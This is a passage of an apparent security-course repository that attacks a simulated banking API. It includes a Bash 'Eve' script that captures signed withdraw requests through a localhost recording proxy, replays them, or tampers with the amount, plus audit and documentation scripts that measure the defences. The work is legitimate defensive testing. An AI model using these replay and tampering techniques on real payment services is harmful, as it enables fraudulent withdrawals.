RUN_ID="${ATTACK_RUN_ID:-$(date -u +%Y%m%dT%H%M%SZ)-$$}"

usage() {
  cat <<EOF
Usage:
  bash attack/attack.sh
  bash attack/attack.sh --capture   (wait for experiments/recording-proxy.js capture)
  bash attack/attack.sh --replay [count]
  bash attack/attack.sh --tamper-amount AMOUNT
EOF
}

require_jq() {
  if ! command -v jq >/dev/null 2>&1; then
    echo "[EVE] Abort: jq is required in Eve's shell."
    exit 1
  fi
}

json_state() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "__missing__"
    return
  fi

  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" | awk '{print $1}'
    return
  fi

  cksum "$file"
}

validate_json_file() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "[EVE] Abort: payload file does not exist: $file"
    return 1
  fi

  if ! jq -e . "$file" >/dev/null 2>&1; then
    echo "[EVE] Abort: payload file is not valid JSON: $file"
    return 1
  fi
}

print_refresh_hint() {
  echo "[EVE] Start the localhost recording proxy and point the bank UI at it, then make a successful local withdraw."
  echo "[EVE] Set CAPTURE_FILE to the proxy's capture file as visible from WSL."
}

extract_body() {
  local file="$1"
  jq -c 'if has("request") then (.request.body | if type == "string" then fromjson else . end) else . end' "$file"
}

payload_age() {
  local file="$1"
  local payload_timestamp payload_epoch now_epoch

  payload_timestamp="$(extract_body "$file" | jq -r '.timestamp // empty')"
  if [[ -z "$payload_timestamp" ]]; then
    echo "[EVE] Abort: payload timestamp is missing."
    print_refresh_hint
    return 1
  fi

  payload_epoch="$(date -u -d "$payload_timestamp" +%s 2>/dev/null || true)"
  if [[ -z "$payload_epoch" ]]; then
    payload_epoch="$(node -e "const ms = Date.parse(process.argv[1]); if (Number.isNaN(ms)) process.exit(1); console.log(Math.floor(ms / 1000));" "$payload_timestamp" 2>/dev/null || true)"
  fi

  if [[ -z "$payload_epoch" ]]; then
    echo "[EVE] Abort: payload timestamp could not be parsed."
    print_refresh_hint
    return 1
  fi

  now_epoch="$(date -u +%s)"
  echo $((now_epoch - payload_epoch))
}

wallclock_ns() {
  # WSL is the attacker shell only and does not require Node.js.
  date +%s%N
}

send_timed_request() {
  local scenario="$1" body_file="$2" auth="$3" index="$4"
  local started ended response status body outcome duration
  started="$(wallclock_ns)"
  if [[ -n "$auth" ]]; then
    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
      -H "Content-Type: application/json" -H "Authorization: $auth" -d "@$body_file")"
  else
    response="$(curl -sS -w $'\n__HTTP_STATUS__:%{http_code}' -X POST "http://$HOST/api/withdraw" \
      -H "Content-Type: application/json" -d "@$body_file")"
  fi
  ended="$(wallclock_ns)"
  status="${response##*__HTTP_STATUS__:}"
  body="${response%$'\n'__HTTP_STATUS__:*}"
  duration="$((ended - started))"
  outcome="$(printf '%s' "$body" | jq -r '.reason // .status // .error // "UNKNOWN"' 2>/dev/null || echo UNKNOWN)"
  if [[ ! -f "$TIMING_CSV" ]]; then
    printf 'run_id,scenario_id,request_index,started_ns,ended_ns,duration_ns,http_status,outcome\n' >> "$TIMING_CSV"
  fi
  printf '%s,%s,%s,%s,%s,%s,%s,%s\n' "$RUN_ID" "$scenario" "$index" "$started" "$ended" "$duration" "$status" "$outcome" >> "$TIMING_CSV"
  printf '%s\n' "$body" | jq .
}

send_payload() {
  local file="$1"
  local count="$2"
  local age auth body_file

  require_jq
  validate_json_file "$file"
  age="$(payload_age "$file")"
  auth="$(jq -r '.request.headers.authorization // empty' "$file" 2>/dev/null || true)"
  body_file="$(mktemp)"
  extract_body "$file" > "$body_file"

  echo "[EVE] Starting Replay Attack on $HOST..."
  echo "[EVE] Payload: $file"
  echo "[EVE] Payload age: ${age}s"

  for ((i = 1; i <= count; i++)); do
    echo "[EVE] Replay attempt #$i..."
    if [[ -n "$auth" ]]; then
      send_timed_request "replay" "$body_file" "$auth" "$i"
    else
      send_timed_request "replay" "$body_file" "" "$i"
    fi
    sleep 1
  done
  rm -f "$body_file"
}

captured_source() {
  if [[ -f "$CAPTURE_FILE" ]]; then
    echo "$CAPTURE_FILE"
    return
  fi

  echo "$PAYLOAD_FILE"
}

capture_mode() {
  require_jq

  echo "[EVE] Waiting for Anis's next withdraw..."
  echo "[EVE] Monitoring captured request..."

  local previous_state current_state
  previous_state="$(json_state "$CAPTURE_FILE")"

  trap 'echo; echo "[EVE] Capture watcher interrupted."; exit 130' INT

  while true; do
    sleep 1
    current_state="$(json_state "$CAPTURE_FILE")"

    if [[ "$current_state" == "$previous_state" ]]; then
      continue
    fi

    previous_state="$current_state"

    if ! validate_json_file "$CAPTURE_FILE"; then
      echo "[EVE] Waiting for the next valid proxy recording..."
      continue
    fi
    local body_file
    body_file="$(mktemp)"
    if ! extract_body "$CAPTURE_FILE" > "$body_file" || ! jq -e . "$body_file" >/dev/null 2>&1; then
      rm -f "$body_file"
      continue
    fi

    echo "[EVE] NEW WITHDRAW PACKET CAPTURED"
    jq -r '
      "[EVE] method: " + (.method | tostring),
      "[EVE] path: " + (.path | tostring),
      "[EVE] user_id: " + (.user_id | tostring),
      "[EVE] amount: " + (.amount | tostring),
      "[EVE] timestamp: " + (.timestamp | tostring),
      "[EVE] nonce: " + (.nonce | tostring),
      "[EVE] request_id: " + (.request_id | tostring)
    ' "$body_file"
    rm -f "$body_file"
    echo "[EVE] Exact captured request saved to $CAPTURE_FILE"
    return
  done
}

replay_mode() {
  local count="${1:-1}"
  local source

  if ! [[ "$count" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: replay count must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  if [[ "$source" == "$CAPTURE_FILE" ]]; then
    echo "[EVE] Using attacker-side captured request: $source"
  else
    echo "[EVE] No attacker-side capture found at $CAPTURE_FILE."
    echo "[EVE] Falling back to synchronized payload: $source"
  fi

  send_payload "$source" "$count"
}

tamper_amount_mode() {
  local new_amount="$1"
  local source original_amount auth body_file

  require_jq

  if ! [[ "$new_amount" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: tampered amount must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  validate_json_file "$source"

  original_amount="$(extract_body "$source" | jq -r '.amount // empty')"
  auth="$(jq -r '.request.headers.authorization // empty' "$source" 2>/dev/null || true)"
  jq --argjson amount "$new_amount" 'if has("request") then .request.body = ((if (.request.body|type)=="string" then (.request.body|fromjson) else .request.body end) | .amount=$amount | tojson) else .amount=$amount end' "$source" > "$TAMPERED_FILE"

  echo "[EVE] TAMPERING WITH CAPTURED PACKET"
  echo "[EVE] Source payload: $source"
  echo "[EVE] Original amount: $original_amount"
  echo "[EVE] Modified amount: $new_amount"
  echo "[EVE] Signature: UNCHANGED"
  echo "[EVE] Signature: preserved without printing its value"
  echo "[EVE] Sending modified packet..."

  body_file="$(mktemp)"
  extract_body "$TAMPERED_FILE" > "$body_file"
  if [[ -n "$auth" ]]; then
    send_timed_request "tamper" "$body_file" "$auth" 1
  else
    send_timed_request "tamper" "$body_file" "" 1
  fi
  rm -f "$body_file"
}

case "${1:-}" in
  "")
    send_payload "$PAYLOAD_FILE" 10
    ;;
  "--capture")
    capture_mode
    ;;
  "--replay")
    replay_mode "${2:-1}"
    ;;
  "--tamper-amount")
    if [[ $# -ne 2 ]]; then
      usage
      exit 1
    fi
    tamper_amount_mode "$2"
    ;;
  "--help"|"-h")
    usage
    ;;
  *)
    usage
    exit 1
    ;;
esac
````

## experiments/audit-egress.js

````js
const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { io } = require('../client/bank/node_modules/socket.io-client');
const { createClient } = require('../server/node_modules/redis');
require('../server/node_modules/dotenv').config({ path: path.resolve(__dirname, '../server/.env') });
const crypto = require('crypto');
const outputDir = path.join(__dirname, 'results', 'preparation');
fs.mkdirSync(outputDir, { recursive: true });
const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
async function request(url, options = {}) {
  const response = await fetch(url, options);
  return { status: response.status, body: await response.json() };
}
async function main() {
  const results = [];
  for (const viz of [false, true]) for (const demo of [false, true]) {
    const name = `viz-${viz}-demo-${demo}`;
    const logPath = path.join(outputDir, `egress-${name}.csv`);
    const outPath = path.join(outputDir, `egress-${name}.stdout.log`);
    const errPath = path.join(outputDir, `egress-${name}.stderr.log`);
    const namespace = `egress-${name}`;
    const env = { ...process.env, PORT: '3000', HOST: '127.0.0.1', VIZ_PORT: '3001', VIZ_ENABLED: String(viz), DEMO_MODE: String(demo), LEGACY_SHARED_SECRET: 'true', REDIS_URL: 'redis://127.0.0.1:6379', NONCE_STORE: 'redis', NONCE_TTL: '300', NONCE_KEY_NAMESPACE: namespace, SQLITE_DB: path.join(outputDir, `${name}.db`), EXPERIMENT_LOG: logPath, CONFIG_ID: name, SCENARIO_ID: 'egress-audit', RUN_ID: name };
    const child = spawn(process.execPath, ['server.js'], { cwd: path.join(__dirname, '../server'), env, windowsHide: true, stdio: ['ignore', fs.openSync(outPath, 'w'), fs.openSync(errPath, 'w')] });
    const base = 'http://127.0.0.1:3000';
    let socket;
    try {
      let healthy = false;
      for (let i = 0; i < 60; i++) { try { await fetch(`${base}/api/health`); healthy = true; break; } catch { await wait(500); } }
      if (!healthy) throw new Error(`${name}: server did not become healthy`);
      socket = io('http://127.0.0.1:3001', { transports: ['websocket'], timeout: 5000 });
      await new Promise((resolve, reject) => { socket.once('connect', resolve); socket.once('connect_error', reject); setTimeout(() => reject(new Error('socket timeout')), 5000); });
      const events = [];
      for (const eventName of ['check-signature','db-update','transaction-result','request-received','check-nonce','check-requestid','check-balance']) socket.on(eventName, (data) => {
        if (eventName === 'request-received' && data.type === 'CONNECTED') return;
        events.push({ eventName, data });
      });
      const wrongPins = [];
      for (let i = 0; i < 5; i++) wrongPins.push(await request(`${base}/api/login`, { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({user_id:'anis_101',pin:'<REDACTED>'}) }));
      const login = await request(`${base}/api/login`, { method:'POST', headers:{'content-type':'application/json'}, body:JSON.stringify({user_id:'anis_101',pin:process.env.DEMO_PIN || '<REDACTED>'}) });
      if (login.status !== 200) throw new Error(`${name}: login status ${login.status}`);
      const { sessionToken, sessionKey } = login.body;
      const payload = { method:'POST',path:'/api/withdraw',user_id:'anis_101',account_id:'acc_777',amount:1,currency:'BDT',timestamp:new Date().toISOString(),nonce:`egress-${crypto.randomUUID()}`,request_id:`egress-${crypto.randomUUID()}` };
      const canonical = [payload.method,payload.path,payload.user_id,payload.account_id,payload.amount,payload.currency,payload.timestamp,payload.nonce,payload.request_id].join('|');
      payload.signature = crypto.createHmac('sha256', sessionKey).update(canonical).digest('hex');
      const tx = await request(`${base}/api/withdraw`, { method:'POST',headers:{'content-type':'application/json',authorization:`Bearer ${sessionToken}`},body:JSON.stringify(payload) });
      if (tx.body.status !== 'ACCEPTED') throw new Error(`${name}: transaction rejected ${tx.body.reason}`);
      await wait(300);
      const redis = createClient({url:'redis://127.0.0.1:6379'});
      await redis.connect();
      const sessionTtlSeconds = await redis.ttl(`session:${sessionToken}`);
      const nonceTtlSeconds = await redis.ttl(`used_nonce:${namespace}:anis_101:${payload.nonce}`);
      await redis.quit();
      const rawEvents = JSON.stringify(events);
      const stdout = fs.readFileSync(outPath, 'utf8');
      const stderr = fs.readFileSync(errPath, 'utf8');
      const csv = fs.existsSync(logPath) ? fs.readFileSync(logPath, 'utf8') : '';
      const indicators = [sessionKey, sessionToken, payload.signature];
      results.push({ config:name, vizEnabled:viz, demoMode:demo, eventsReceived:events.map((x)=>x.eventName), socketSensitiveValuesFound: indicators.map((value)=>rawEvents.includes(value)), consoleSensitiveValuesFound: indicators.map((value)=>(stdout+stderr).includes(value)), experimentCsvSensitiveValuesFound: indicators.map((value)=>csv.includes(value)), transactionHttpStatus:tx.status, wrongPinStatuses:wrongPins.map((x)=>x.status), correctPinAfterFailuresStatus:login.status, sessionKeyLayout:'session:<sessionToken>', sessionTtlSeconds, nonceKeyLayout:'used_nonce:<namespace>:<user_id>:<nonce>', nonceTtlSeconds });
    } finally {
      if (socket) socket.close();
      child.kill();
      await new Promise((resolve)=>{ if(child.exitCode!==null) resolve(); else { child.once('exit',resolve); setTimeout(resolve,1500); } });
    }
  }
  const out = path.join(outputDir, 'egress-audit-matrix.json');
  fs.writeFileSync(out, JSON.stringify(results,null,2)+'\n');
  process.stdout.write(JSON.stringify({ output:out, results },null,2)+'\n');
}
main().catch((error)=>{ process.stderr.write(`${error.stack||error.message}\n`); process.exitCode=1; });
````

## experiments/lib/http.js

````js
async function timedRequest(url, options = {}) {
  const start = process.hrtime.bigint();
  const response = await fetch(url, options);
  const text = await response.text();
  const end = process.hrtime.bigint();
  let body;
  try { body = JSON.parse(text); } catch { body = text; }
  return {
    start_ns: start.toString(),
    end_ns: end.toString(),
    duration_ns: (end - start).toString(),
    status: response.status,
    body
  };
}

module.exports = { timedRequest };
````

## experiments/recording-proxy.js

````js
const fs = require('fs');
const http = require('http');
const os = require('os');
const path = require('path');

const upstream = new URL(process.env.PROXY_UPSTREAM || 'http://127.0.0.1:3000');
if (!['127.0.0.1', 'localhost'].includes(upstream.hostname)) throw new Error('Recording proxy only permits a localhost upstream');
const port = Number(process.env.PROXY_PORT || 3002);
const outputPath = process.env.PROXY_CAPTURE_FILE || path.join(os.tmpdir(), 'cs-project-onpath-capture.json');
const captureLogPath = `${outputPath}.jsonl`;
const withdrawalCapturePath = process.env.PROXY_WITHDRAW_CAPTURE_FILE || `${outputPath}.withdraw.json`;

const server = http.createServer((request, response) => {
  const started = process.hrtime.bigint();
  const chunks = [];
  request.on('data', (chunk) => chunks.push(chunk));
  request.on('end', () => {
    const bodyBuffer = Buffer.concat(chunks);
    const headers = { ...request.headers };
    delete headers.host;
    delete headers['content-length'];
    const proxyRequest = http.request({
      hostname: upstream.hostname,
      port: Number(upstream.port || 80),
      method: request.method,
      path: request.url,
      headers: { ...headers, 'content-length': bodyBuffer.length }
    }, (upstreamResponse) => {
      const responseChunks = [];
      upstreamResponse.on('data', (chunk) => responseChunks.push(chunk));
      upstreamResponse.on('end', () => {
        const responseBody = Buffer.concat(responseChunks);
        const ended = process.hrtime.bigint();
        const record = {
          capturedAt: new Date().toISOString(),
          start_ns: started.toString(),
          end_ns: ended.toString(),
          duration_ns: (ended - started).toString(),
          request: {
            method: request.method,
            path: request.url,
            headers: request.headers,
            body: bodyBuffer.toString('utf8')
          },
          response: { statusCode: upstreamResponse.statusCode, body: responseBody.toString('utf8') }
        };
        fs.appendFileSync(captureLogPath, `${JSON.stringify(record)}\n`, { mode: 0o600 });
        const tempPath = `${outputPath}.${process.pid}.tmp`;
        fs.writeFileSync(tempPath, `${JSON.stringify(record, null, 2)}\n`, { mode: 0o600 });
        fs.renameSync(tempPath, outputPath);
        if (request.method === 'POST' && new URL(request.url, upstream).pathname === '/api/withdraw') {
          const withdrawalTempPath = `${withdrawalCapturePath}.${process.pid}.tmp`;
          fs.writeFileSync(withdrawalTempPath, `${JSON.stringify(record, null, 2)}\n`, { mode: 0o600 });
          fs.renameSync(withdrawalTempPath, withdrawalCapturePath);
        }
        response.writeHead(upstreamResponse.statusCode || 502, upstreamResponse.headers);
        response.end(responseBody);
      });
    });
    proxyRequest.on('error', (error) => {
      response.writeHead(502, { 'content-type': 'application/json' });
      response.end(JSON.stringify({ error: 'UPSTREAM_UNAVAILABLE', message: error.message }));
    });
    proxyRequest.end(bodyBuffer);
  });
});

server.listen(port, '127.0.0.1', () => {
  console.log(`Recording proxy listening on http://127.0.0.1:${port}; capture file: ${outputPath}`);
});

function shutdown() { server.close(() => process.exit(0)); }
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
````

## experiments/render-documentation.js

````js
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const projectRoot = path.resolve(__dirname, '..');
const experimentRoot = path.join(projectRoot, 'experiments');
const resultRoot = path.join(experimentRoot, 'results');
const outputPath = path.join(projectRoot, 'docs', 'EXPERIMENTS.md');
const manifestPath = path.join(resultRoot, 'SHA256SUMS.json');

function walk(directory) {
  return fs.readdirSync(directory, { withFileTypes: true })
    .sort((left, right) => left.name.localeCompare(right.name))
    .flatMap((entry) => {
      const absolutePath = path.join(directory, entry.name);
      return entry.isDirectory() ? walk(absolutePath) : [absolutePath];
    });
}

function refreshResultManifest() {
  const files = walk(resultRoot).filter((filePath) => path.resolve(filePath) !== path.resolve(manifestPath));
  const entries = files.map((filePath) => ({
    path: relativePath(filePath),
    sizeBytes: fs.statSync(filePath).size,
    sha256: crypto.createHash('sha256').update(fs.readFileSync(filePath)).digest('hex')
  }));
  fs.writeFileSync(manifestPath, `${JSON.stringify(entries, null, 2)}\n`, 'utf8');
}

function relativePath(absolutePath) {
  return path.relative(projectRoot, absolutePath).split(path.sep).join('/');
}

function sha256(absolutePath) {
  try {
    return crypto.createHash('sha256').update(fs.readFileSync(absolutePath)).digest('hex');
  } catch (error) {
    return `unavailable while file is open: ${error.code || error.message}`;
  }
}

function fenceFor(text) {
  const longest = Math.max(0, ...Array.from(text.matchAll(/`+/g), (match) => match[0].length));
  return '`'.repeat(Math.max(3, longest + 1));
}

function languageFor(filePath) {
  const extension = path.extname(filePath).toLowerCase();
  return ({ '.js': 'js', '.json': 'json', '.csv': 'csv', '.log': 'text' })[extension] || 'text';
}

function percentile(sorted, percent) {
  if (!sorted.length) return null;
  const position = (sorted.length - 1) * percent;
  const lower = Math.floor(position);
  const upper = Math.ceil(position);
  return lower === upper ? sorted[lower] : sorted[lower] + (sorted[upper] - sorted[lower]) * (position - lower);
}

function aggregate(values) {
  const sorted = values.filter(Number.isFinite).sort((left, right) => left - right);
  if (!sorted.length) return { count: 0, min: null, max: null, mean: null, p50: null, p95: null, p99: null };
  return { count: sorted.length, min: sorted[0], max: sorted[sorted.length - 1],
    mean: sorted.reduce((sum, value) => sum + value, 0) / sorted.length,
    p50: percentile(sorted, 0.5), p95: percentile(sorted, 0.95), p99: percentile(sorted, 0.99) };
}

function parseCsv(line) {
  const cells = []; let cell = ''; let quoted = false;
  for (let index = 0; index < line.length; index += 1) {
    const char = line[index];
    if (char === '"' && quoted && line[index + 1] === '"') { cell += '"'; index += 1; }
    else if (char === '"') quoted = !quoted;
    else if (char === ',' && !quoted) { cells.push(cell); cell = ''; }
    else cell += char;
  }
  cells.push(cell); return cells;
}

function largeFileSummary(filePath, text, rows) {
  const aggregates = {};
  if (path.extname(filePath).toLowerCase() === '.csv' && rows.length > 1) {
    const headers = parseCsv(rows[0]); const columns = headers.map(() => []);
    for (const row of rows.slice(1)) parseCsv(row).forEach((value, index) => {
      if (value !== '' && Number.isFinite(Number(value))) columns[index].push(Number(value));
    });
    headers.forEach((header, index) => { if (columns[index].length) aggregates[header] = aggregate(columns[index]); });
  } else {
    const numbers = [...text.matchAll(/(?<![A-Za-z0-9_])[-+]?(?:\d+\.?\d*|\.\d+)(?:[eE][-+]?\d+)?/g)].map((match) => Number(match[0]));
    aggregates.numericValues = aggregate(numbers);
  }
  return { totalRows: rows.length, first20: rows.slice(0, 20), last20: rows.slice(-20), aggregates };
}

function redactAuthenticationArtifacts(filePath, text) {
  if (/\.json$/i.test(filePath)) {
    text = text.replace(/("signature"\s*:\s*")[^"]*(")/gi, '$1[REDACTED SIGNATURE]$2');
  }
  if (/\.(json|log)$/i.test(filePath)) {
    text = text.replace(/((?:preserved )?signature:\s*)[0-9a-f]{16,}/gi, '$1[REDACTED SIGNATURE]');
  }
  return text;
}

function buildTree(files) {
  const nodes = new Map();
  for (const absolutePath of files) {
    const rel = path.relative(experimentRoot, absolutePath).split(path.sep);
    let current = '';
    for (let index = 0; index < rel.length; index += 1) {
      current = current ? `${current}/${rel[index]}` : rel[index];
      if (!nodes.has(current)) nodes.set(current, { name: rel[index], isDirectory: index < rel.length - 1 });
    }
  }
  const children = new Map();
  for (const [key, node] of nodes) {
    const parent = key.includes('/') ? key.slice(0, key.lastIndexOf('/')) : '';
    if (!children.has(parent)) children.set(parent, []);
    children.get(parent).push({ ...node, key });
  }
  const lines = ['experiments/'];
  function emit(parent, prefix) {
    const entries = (children.get(parent) || []).sort((a, b) => a.name.localeCompare(b.name));
    entries.forEach((entry, index) => {
      const last = index === entries.length - 1;
      lines.push(`${prefix}${last ? 'â””â”€â”€ ' : 'â”œâ”€â”€ '}${entry.name}${entry.isDirectory ? '/' : ''}`);
      if (entry.isDirectory) emit(entry.key, `${prefix}${last ? '    ' : 'â”‚   '}`);
    });
  }
  emit('', '');
  return lines.join('\n');
}

refreshResultManifest();
const allFiles = walk(experimentRoot);
const resultFiles = allFiles.filter((filePath) => filePath.startsWith(`${resultRoot}${path.sep}`));
const manifest = JSON.parse(fs.readFileSync(manifestPath, 'utf8'));
const manifestHashes = new Map(manifest.map((entry) => [entry.path, entry.sha256]));
const summary = JSON.parse(fs.readFileSync(path.join(resultRoot, 'baseline', 'phase0-summary.json'), 'utf8'));
const environment = JSON.parse(fs.readFileSync(path.join(resultRoot, 'environment.json'), 'utf8'));
const cases = JSON.parse(fs.readFileSync(path.join(resultRoot, 'baseline', 'measured-cases.json'), 'utf8'));
const nonceGrowth = JSON.parse(fs.readFileSync(path.join(resultRoot, 'baseline', 'nonce-growth-measured.json'), 'utf8'));

const lines = [];
const add = (...items) => lines.push(...items);
const code = String.fromCharCode(96);
add(
  '# Complete Experiment Dossier',
  '',
  'Generated from the current `experiments/` tree. It includes the complete folder structure, a file inventory, measured interpretation, and a full text/code listing of every file currently under `experiments/`.',
  '',
  '## Scope and evidence rules',
  '',
  '- Phase 0 baseline artifacts and Phase 1â€“3 implementation/test artifacts are recorded here. The full Phase 4 experiment matrix and Phase 5 USSD evaluation have not been run.',
  '- Every numeric finding below is read from a saved run artifact. No unrun experiment is represented as a result.',
  '- Phase 0 CSVs predate per-request monotonic timing; their missing durations are called out rather than reconstructed. Updated scripts record `process.hrtime.bigint()` start, end, and duration fields.',
  '- The WSL-only Bash attacker does not require Node.js; its client-side timing CSV uses WSL `date +%s%N`. The Windows server experiment log records monotonic `process.hrtime.bigint()` request and layer timings for those same requests.',
  '- Request HMAC signature values are redacted in this document because they are replay-capable authentication artifacts. Their source files remain unchanged in `experiments/results/`; the recorded hashes refer to those original files.',
  '- Every result file is inventoried with current path, byte size, and SHA-256. For a result over 200 KB or 1,000 rows, only its first 20 rows, last 20 rows, and aggregate statistics are shown; the complete file remains on disk. Source code and harness scripts stay in full.',
  '- The generated document itself is outside `experiments/`, so it is not included in the experiment tree or its result manifest.',
  '',
  '## Reproduction environment',
  '',
  `- Captured at: ${code}${environment.capturedAt}${code} UTC.`,
  `- Operating system: ${environment.host.osVersion} (${environment.host.os}).`,
  `- CPU: ${environment.host.cpuModel}; ${environment.host.logicalCpuCount} logical CPUs.`,
  `- RAM: ${environment.host.totalRamBytes} bytes (${environment.host.totalRamGiB} GiB).`,
  `- Node.js: ${environment.runtime.node}.`,
  `- SQLite Node package: ${environment.runtime.sqlite3NodePackage}; SQLite library: ${environment.runtime.sqliteLibrary}.`,
  `- Nonce store: ${environment.nonceBackend.product}, version ${environment.nonceBackend.memuraiVersion}; Redis protocol ${environment.nonceBackend.redisProtocolVersion}. Memurai, not stock Redis, was used.`,
  '- Memurai listens on IPv4 only. The configured URL is `redis://127.0.0.1:6379`; `localhost` may resolve to `::1` and fail.',
  '- Native Windows ports 3000, 3001, and 6379 were reachable. WSL reached the Windows API at `http://localhost:3000/api/health` with HTTP 200 and body `OK`.',
  `- Git commit captured in environment metadata: ${code}${environment.audit?.commitHash || 'not recorded'}${code}; status snapshot clean: ${environment.audit?.gitStatusClean ?? 'not recorded'}. The snapshot is preserved verbatim in ${code}results/environment.json${code}.`,
  '- The attacker shell ran in WSL. All server, Node, SQLite, Memurai, and measurement traffic ran on Windows and targeted only the local simulation.',
  '',
  '## Phase 0 run method',
  '',
  '1. Start the Windows Memurai service and verify it with `C:\\Applications\\memurai-cli.exe ping`.',
  '2. Set `REDIS_URL=redis://127.0.0.1:6379` in the ignored `server/.env` file.',
  '3. Start the server natively from `server/`; its startup log reports the bank API on 3000 and Socket.IO on 3001.',
  '4. From WSL, check `curl http://localhost:3000/api/health` before running attacks.',
  '5. Start `experiments/recording-proxy.js` on Windows and route a local client through port 3002; keep the exact request recording in a private temp directory outside the repository.',
  '6. Set WSL `CAPTURE_FILE` to the Windows recording path mounted into WSL, then run `attack/attack.sh --capture`, replay, tamper, stale-payload, and nonce-crash cases.',
  '7. A native Windows Node script sent 50 parallel copies of one valid payload, tested request-ID tampering and clock offsets, reset the demo state, created one successful seed transaction, cleared its nonce, then sent 10,000 sequential requests with fresh nonces and that already-successful request ID. They were rejected at request-ID after nonce consumption.',
  '8. `C:\\Applications\\memurai-cli.exe --scan --pattern used_nonce:*` counted nonce keys; `INFO memory` supplied `used_memory`.',
  '',
  'The Phase 0 parallel run used one batch of 50. Each Phase 0 clock offset was measured once. The Phase 0 10,000-request run is â€œnonce-store growth from requests rejected at the request-ID check,â€ not legitimate transactions.',
  '',
  '## Measured findings',
  '',
  '| Measurement | Observed result | Evidence |',
  '|---|---|---|',
  `| 50 identical parallel valid requests | ${cases.parallel50.counts.ACCEPTED} accepted; ${cases.parallel50.counts.NONCE_FAIL} returned NONCE_FAIL. | ${code}baseline/parallel-50-responses.json${code} |`,
  `| Changed request ID, original signature | HTTP ${cases.changedRequestIdWithOldSignature.httpStatus}, ${cases.changedRequestIdWithOldSignature.reason}. | ${code}baseline/measured-cases.json${code} |`,
  `| Clock skew -10m | ${cases.clockSkew.find((entry) => entry.label === '-10m').result.reason}. | ${code}baseline/measured-cases.json${code} |`,
  `| Clock skew -1m | ${cases.clockSkew.find((entry) => entry.label === '-1m').result.status}. | ${code}baseline/measured-cases.json${code} |`,
  `| Clock skew +10s, +1m, +10m | ${cases.clockSkew.filter((entry) => entry.label.startsWith('+')).map((entry) => `${entry.label}: ${entry.result.reason}`).join('; ')}. | ${code}baseline/measured-cases.json${code} |`,
  `| Exact in-window replay | ${readLog('immediate-replay.log').match(/"reason": "([^"]+)"/)?.[1] || 'see raw log'}. | ${code}baseline/immediate-replay.log${code} |`,
  `| Replay after nonce store clear | ${readLog('replay-after-nonce-crash.log').match(/"reason": "([^"]+)"/)?.[1] || 'see raw log'}; crash endpoint deleted ${JSON.parse(fs.readFileSync(path.join(resultRoot, 'baseline', 'nonce-crash.json'), 'utf8')).deleted} key. | ${code}baseline/replay-after-nonce-crash.log${code}, ${code}baseline/nonce-crash.json${code} |`,
  `| Nonce-store growth from requests rejected at the request-ID check | ${nonceGrowth.usedNonceKeys} keys; ${code}${nonceGrowth.usedMemoryBytes}${code} bytes used_memory (${nonceGrowth.usedMemoryHuman}). | ${code}baseline/nonce-growth-measured.json${code}, ${code}baseline/unique-nonce-10000-responses.csv${code} |`,
  '| Tampered amount with a fresh signed source | SIGNATURE_FAIL. | `baseline/tamper-fresh.log` |',
  '| Correctly signed payload older than 300 seconds | TIMESTAMP_FAIL. | `baseline/stale-replay.log` |',
  '| WSL to Windows health check | HTTP 200; body `OK`, before and after server restart. | `baseline/wsl-health.log`, `baseline/wsl-health-postrotation.log` |',
  '',
  '### Section 5 comparison',
  '',
  `The Phase 0 comparison recorded ${summary.section5Comparison.mismatchesAmongMeasuredCases.length} mismatches among measured cases. Tested response descriptions matched the report for health, accepted withdrawal, fresh tampering, stale signed request, reused nonce, request-ID replay after nonce clearing, and capture mode.`,
  '',
  'Section 5 responses in `PROJECT_AUDIT_REPORT.md` are labeled as measured or code-derived. The Phase 0 10,000-request artifact represents requests rejected at the request-ID check; nonce records were written before that check.',
  '',
  '### Future timestamp tolerance hypothesis for E3',
  '',
  'E3 should sweep future tolerance values of 0 s, 5 s, 30 s, and 60 s and measure false rejections for fast legitimate client clocks. Phase 0 observed rejection at +10 s under the 5 s default. The sweep is a hypothesis to test; no false-rejection rate is claimed yet.',
  '',
  '### On-path capture procedure',
  '',
  '`recording-proxy.js` is a local Node proxy restricted to a localhost upstream. Route the UI/API client to port 3002 and set `PROXY_CAPTURE_FILE` to a private path outside the repository. The proxy saves the exact request method, path, headers, and body it forwards. `attack/attack.sh --replay` reads the proxy envelope from `CAPTURE_FILE`; it does not use a payload file written by the server. Capture files include a signature and authorization header, so keep them outside `experiments/`, `docs/`, and version control.',
  '',
  '### Tests and build',
  '',
  '- Server unit and integration tests use Nodeâ€™s built-in test runner on Windows. Their captured output is inventoried below.',
  '- The bank UI production build was run after removing the global signing secret from browser code. Client requests use a per-session signing key held in memory.',
  '- Legacy shared-secret verification remains behind `LEGACY_SHARED_SECRET=true`; the browser bundle contains no global shared key.',
  '',
  '## Experiment directory structure',
  '',
  '```text',
  buildTree(allFiles),
  '```',
  '',
  '## File inventory',
  '',
  '| File | Bytes | SHA-256 |',
  '|---|---:|---|'
);

for (const absolutePath of allFiles) {
  const rel = relativePath(absolutePath);
  const stat = fs.statSync(absolutePath);
  const listedHash = manifestHashes.get(rel);
  const digest = listedHash || sha256(absolutePath);
  add(`| ${code}${rel}${code} | ${stat.size} | ${code}${digest}${code} |`);
}

const correctionArtifacts = path.join(resultRoot, 'corrections');
if (fs.existsSync(correctionArtifacts)) {
  add('', '## Phase 0 correction measurements', '', 'These are scoped correction checks, not the full Phase 4 experiment matrix.', '');
  const memoryFiles = fs.readdirSync(correctionArtifacts).filter((name) => /^nonce-memory-(accepted|requestid)-.*100k-summary\.json$/.test(name));
  for (const name of memoryFiles) {
    const result = JSON.parse(fs.readFileSync(path.join(correctionArtifacts, name), 'utf8'));
